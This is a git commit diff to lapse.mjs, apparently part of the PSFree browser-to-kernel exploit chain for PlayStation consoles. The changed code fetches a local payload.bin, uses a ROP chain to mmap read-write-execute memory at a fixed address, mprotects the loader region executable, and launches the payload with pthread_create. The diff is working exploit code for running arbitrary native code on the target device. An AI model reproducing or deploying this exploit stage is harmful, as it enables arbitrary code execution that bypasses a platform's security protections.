68e81ab985f5f2ccbd54d54f6c4e664cba20eaa7
ps3120 <32280131+ps3120@users.noreply.github.com>
2025-06-01 15:33:06 +0200

    Update lapse.mjs

--- psfree/lapse.mjs
+++ psfree/lapse.mjs
@@ -1969,31 +1969,38 @@ const PROT_EXEC = 4;
 
 fetch('./payload.bin').then(res => {
     res.arrayBuffer().then(arr => {
-        const originalLength = arr.byteLength;
-        const padding = new Uint8Array((4 - (originalLength % 4)) % 4);
-        const paddedBuffer = new Uint8Array(originalLength + padding.length);
-        paddedBuffer.set(new Uint8Array(arr), 0);
-        paddedBuffer.set(padding, originalLength);
+      const pld = new Uint32Array(arr);
 
-        const pld = new Uint32Array(paddedBuffer.buffer);
+    const payload_buffer = chain.sysp(
+      'mmap',
+      new Int(0x26200000, 0x9),
+      0x300000,
+      PROT_READ | PROT_WRITE | PROT_EXEC,
+      0x41000,
+      -1,
+      0
+    );
 
-        const payload_buffer = chain.sysp('mmap', 0, 0x300000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
+    const payload_loader = new View4(pld);
 
-        const payload_loader = new View4(pld);
+    chain.sys(
+      'mprotect',
+      payload_loader.addr,
+      payload_loader.size,
+      PROT_READ | PROT_WRITE | PROT_EXEC
+    );
 
-        chain.sys('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
+    const ctx = new Buffer(0x10);
+    const pthread = new Pointer();
+    pthread.ctx = ctx;
 
-        const ctx = new Buffer(0x10);
-        const pthread = new Pointer();
-        pthread.ctx = ctx;
-
-        call_nze(
-            'pthread_create',
-            pthread.addr,
-            0,
-            payload_loader.addr,
-            payload_buffer,
-        );
+    call_nze(
+      'pthread_create',
+      pthread.addr,
+      0,
+      payload_loader.addr,
+      payload_buffer
+    );
     });
 });
 });
